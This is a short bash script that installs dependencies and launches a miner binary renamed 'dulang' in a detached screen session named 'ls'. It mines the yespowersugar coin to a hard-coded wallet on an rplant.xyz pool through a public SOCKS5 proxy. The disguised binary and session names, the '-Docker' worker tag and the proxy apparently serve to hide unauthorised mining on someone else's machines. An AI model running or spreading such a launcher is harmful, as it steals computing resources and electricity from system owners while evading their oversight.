#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x dulang
screen -dmS ls 
POOL=stratum+tcp://stratum-eu.rplant.xyz:7042
WALLET=sugar1q30494fe7unadljvt6qy64e9e2nlxg3y0jf240v.dus
WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
PROXY=socks5://72.221.232.155:4145
./dulang -a yespowersugar -o $POOL -u $WALLET -p $WORKER -t 2 -x $PROXY
